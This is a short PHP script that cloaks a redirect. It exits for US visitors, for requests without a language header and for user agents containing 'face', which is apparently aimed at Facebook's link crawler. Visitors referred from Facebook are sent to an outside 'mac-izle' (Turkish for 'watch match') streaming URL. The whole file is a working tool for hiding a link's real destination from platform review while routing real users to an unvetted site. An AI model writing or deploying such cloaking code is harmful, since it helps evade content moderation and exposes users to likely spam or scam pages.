<?php
if($_SERVER['HTTP_X_APPENGINE_COUNTRY'] == 'US'){
exit;
}
if(empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
exit;
}
if(strpos($_SERVER['HTTP_USER_AGENT'],"face") !== false){
exit;
}
$file = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$ref = $_SERVER['HTTP_REFERER'];
if(strpos($ref,"facebook") !== false){
header("Location: http://petudi.us/mac-izle");
}else{
exit;
}
